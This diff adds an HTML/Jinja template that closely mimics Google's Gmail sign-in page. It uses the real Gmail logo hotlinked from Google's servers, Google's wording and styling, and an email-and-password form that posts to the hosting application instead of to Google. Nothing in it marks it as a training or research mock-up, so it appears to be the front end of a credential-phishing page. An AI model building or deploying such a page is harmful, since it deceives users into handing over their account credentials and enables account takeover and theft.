@@ -1,0 +1,101 @@
+{% extends 'layout.html' %}
+{% block content %}
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        font-family: "Roboto", Arial, sans-serif;
+    }
+
+    .login-background {
+        background: linear-gradient(135deg, #f3f8ff, #e7ffe7, #fff8e1);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 40px 16px;
+    }
+
+    .gmail-login-box {
+        max-width: 400px;
+        width: 100%;
+        padding: 40px 32px;
+        background-color: #fff;
+        border: 1px solid #dadce0;
+        border-radius: 8px;
+        box-shadow: 0 1px 3px rgba(60, 64, 67, 0.28);
+    }
+
+    .gmail-logo {
+        display: block;
+        width: 75px;
+        margin: 0 auto 15px;
+    }
+
+    .signin-header {
+        text-align: center;
+        font-size: 24px;
+        font-weight: 500;
+        color: #202124;
+    }
+
+    .signin-subtext {
+        text-align: center;
+        font-size: 15px;
+        color: #5f6368;
+        margin-bottom: 25px;
+    }
+
+    .form-label {
+        font-size: 14px;
+        color: #3c4043;
+    }
+
+    .form-control {
+        border-radius: 4px;
+        height: 40px;
+        font-size: 14px;
+    }
+
+    .btn-signin {
+        background-color: #1a73e8;
+        color: white;
+        font-weight: 500;
+        height: 40px;
+        width: 100%;
+        border: none;
+        border-radius: 4px;
+        margin-top: 25px;
+    }
+
+    .forgot-link {
+        font-size: 13px;
+        color: #1a73e8;
+        text-decoration: none;
+        display: block;
+        text-align: right;
+        margin-top: 10px;
+    }
+</style>
+
+<div class="login-background">
+    <div class="gmail-login-box">
+        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Gmail Logo" class="gmail-logo">
+        <div class="signin-header">Sign in</div>
+        <div class="signin-subtext">to continue to Gmail</div>
+
+        <form method="POST">
+            <div class="mb-3">
+                <label class="form-label" for="email">Email or phone</label>
+                <input type="email" class="form-control" name="email" placeholder="Enter email" required>
+            </div>
+            <div class="mb-3">
+                <label class="form-label" for="password">Password</label>
+                <input type="password" class="form-control" name="password" placeholder="Enter password" required>
+            </div>
+            <a href="#" class="forgot-link">Forgot password?</a>
+            <button type="submit" class="btn btn-signin">Next</button>
+        </form>
+    </div>
+</div>
+{% endblock %}
